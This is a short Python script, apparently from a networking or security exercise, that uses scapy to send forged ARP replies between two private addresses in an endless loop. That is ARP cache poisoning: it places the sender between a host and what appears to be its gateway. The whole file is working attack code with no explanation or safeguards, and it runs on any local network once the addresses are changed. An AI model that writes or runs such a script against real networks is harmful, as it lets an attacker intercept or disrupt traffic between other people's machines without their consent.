#!/usr/bin/env python
#Ji Pan
import sys
import os
from scapy.all import *

def main():
    p1 = ARP (psrc = '10.10.111.1', pdst = '10.10.111.101')
    p2 = ARP (psrc = '10.10.111.101', pdst = '10.10.111.1')
    
    while True:
        send (p1)
        send (p2)
if __name__=="__main__":
    main()